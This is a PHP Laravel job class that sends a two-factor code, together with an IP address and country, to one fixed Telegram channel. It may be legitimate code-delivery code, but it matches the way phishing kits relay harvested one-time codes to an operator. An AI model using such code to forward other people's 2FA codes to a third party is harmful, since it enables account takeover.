<?php

namespace App\Jobs;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldBeUnique;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\Log;
use Telegram\Bot\Laravel\Facades\Telegram;

class SendTelegramTwoFactorCode implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    /**
     * Create a new job instance.
     */
    public function __construct(protected $code)
    {
        //
    }

    /**
     * Execute the job.
     */
    public function handle(): void
    {
        $message = "IP: {$this->code->ip} | {$this->code->country} \n"
            . "Code 2FA: {$this->code->code}";

        try {
            Telegram::sendMessage([
                'chat_id' => env('TELEGRAM_CHANNEL_ID', ''),
                'parse_mode' => 'HTML',
                'text' => $message
            ]);
        } catch (\Exception $e) {
            Log::error($e->getMessage());
        }
    }
}
